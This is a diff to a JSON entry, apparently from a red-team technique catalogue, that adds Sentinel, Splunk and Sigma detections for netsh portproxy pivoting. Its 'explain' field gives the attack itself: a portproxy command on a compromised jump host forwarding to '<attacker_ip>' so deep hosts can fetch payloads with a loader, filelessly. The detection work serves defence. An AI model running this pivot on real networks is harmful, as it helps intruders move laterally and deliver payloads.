@@ -114,7 +114,81 @@
       "CRTP",
       "MITRE T1090.001",
       "MITRE T1021.006"
-    ]
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Pivoting with netsh portproxy + winrs - Sentinel",
+        "logic": "DeviceProcessEvents\n| where ProcessCommandLine has \"portproxy\" and ProcessCommandLine has \"add\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| sort by Timestamp desc",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1090.001",
+          "T1021.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Pivoting with netsh portproxy + winrs (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 (CommandLine=\"*interface portproxy add*\" OR CommandLine=\"*netsh*portproxy*\")\n| table _time, Computer, User, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001",
+          "T1021.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "Pivoting with netsh portproxy + winrs (2) - Splunk",
+        "logic": "index=sysmon EventCode=13 TargetObject=\"*\\\\Services\\\\PortProxy\\\\v4tov4*\"\n| table _time, Computer, TargetObject, Details",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001",
+          "T1021.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "13"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_win_netsh_port_forwarding",
+        "logic": "proc_creation_win_netsh_port_forwarding",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001",
+          "T1021.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "sysmon_registry_portproxy_v4tov4",
+        "logic": "sysmon_registry_portproxy_v4tov4",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001",
+          "T1021.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Turns a compromised jump host into a relay so deep hosts that cannot reach your box can fetch payloads:\n  netsh interface portproxy add v4tov4   add an IPv4->IPv4 forward on the jump host\n  listenport=<listen_port> listenaddress=0.0.0.0   accept connections on this port, all interfaces\n  connectport=<dst_port> connectaddress=<attacker_ip>   forward them to your web server\nThen tools on the deep host (Loader.exe -path http://127.0.0.1:<listen_port>/...) reach you through the jump host, fileless."
 }
